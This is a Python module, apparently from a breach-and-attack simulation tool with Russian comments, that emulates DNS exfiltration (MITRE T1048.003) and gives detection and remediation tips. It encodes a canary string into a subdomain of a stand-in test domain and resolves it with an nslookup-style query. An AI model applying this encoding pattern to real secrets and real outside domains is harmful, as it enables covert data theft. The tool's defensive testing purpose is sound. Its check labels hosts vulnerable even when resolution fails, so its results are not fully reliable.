"""
T1048.003: Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/DNS Protocol
Тактика: Exfiltration (TA0010)
"""

import socket
import base64
from core.base_technique import BaseTechnique
from core.models import TechniqueMeta, Tactic, Severity, AttackStatus


class T1048ExfiltrationSim(BaseTechnique):
    def get_meta(self) -> TechniqueMeta:
        return TechniqueMeta(
            technique_id="T1048.003",
            name="Exfiltration Over Alternative Protocol (Эмуляция скрытой эксфильтрации через DNS)",
            tactic=Tactic.EXFILTRATION,
            description="Злоумышленники кодируют конфиденциальные данные (в Base64/HEX) и передают их наружу через протокол разрешения имен DNS или ICMP, обходя межсетевые экраны.",
            severity=Severity.HIGH,
            mitre_url="https://attack.mitre.org/techniques/T1048/003/",
            mitre_detection_tips="Мониторинг сетевых запросов DNS с длинными именами субдоменов, высокой энтропией и частыми обращениями к подозрительным доменам.",
            remediation="Внедрение корпоративного DNS-фильтра (DNS Sinkhole / DNS Firewall), блокировка прямых исходящих UDP/53 запросов мимо корпоративного DNS-сервера."
        )

    def run_simulation(self) -> tuple[AttackStatus, str, str, str]:
        # Формируем безопасный канареечный псевдо-токен
        dummy_secret = "secret_canary_test"
        encoded_token = base64.b32encode(dummy_secret.encode()).decode().lower()[:12]
        test_domain = f"{encoded_token}.canary-test.mitre-bas.local"
        
        cmd = f"nslookup {test_domain}"
        try:
            # Пытаемся разрешить псевдодомен
            try:
                socket.gethostbyname(test_domain)
            except socket.gaierror:
                # Ошибка разрешения ожидаема, так как домен тестовый
                pass

            # Если сокет смог отправить запрос и ОС не заблокировала сетевой вызов
            return (
                AttackStatus.VULNERABLE,
                cmd,
                f"Сетевой стек ОС беспрепятственно отправил тестовый DNS-пакет со скрытыми данными ({test_domain}). Прямой egress-трафик UDP/53 не фильтруется.",
                ""
            )
        except PermissionError as pe:
            return AttackStatus.PROTECTED, cmd, "", f"Сетевая активность заблокирована локальным брандмауэром: {pe}"
        except Exception as e:
            return AttackStatus.ERROR, cmd, "", str(e)

    def cleanup(self) -> tuple[bool, str]:
        return True, "Сетевой тест завершен, постоянных артефактов на хосте не создавалось"
